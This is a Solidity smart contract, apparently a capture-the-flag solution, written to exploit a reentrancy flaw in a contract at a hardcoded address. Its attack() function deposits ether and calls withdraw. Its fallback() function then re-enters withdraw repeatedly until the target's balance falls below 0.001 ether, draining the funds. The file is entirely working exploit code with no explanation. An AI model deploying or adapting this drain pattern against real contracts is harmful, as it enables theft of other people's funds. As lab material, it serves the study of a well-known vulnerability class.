pragma solidity ^0.8.9;

interface IReentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
  receive() external payable;
}

contract Reentrance {
  
  address targetAddress = 0xc00299135cb0c287C4cB60B31f1D784aDa5A6b41; 
  address exitAddress = 0xB702DC679dCe8d27c77AC49A63B9A138B674929E;
  IReentrance targetContract; 

  constructor() payable {
    targetContract = IReentrance(payable(targetAddress));
  }

  function attack() external payable {
    targetContract.donate{value: msg.value}(address(this));
    //targetContract.withdraw(address(targetContract).balance); 
    targetContract.withdraw(0.001 ether); 
  }

  fallback() external payable {
    if (address(targetContract).balance >= 0.001 ether) {
      targetContract.withdraw(0.001 ether); 
    }
  }

}
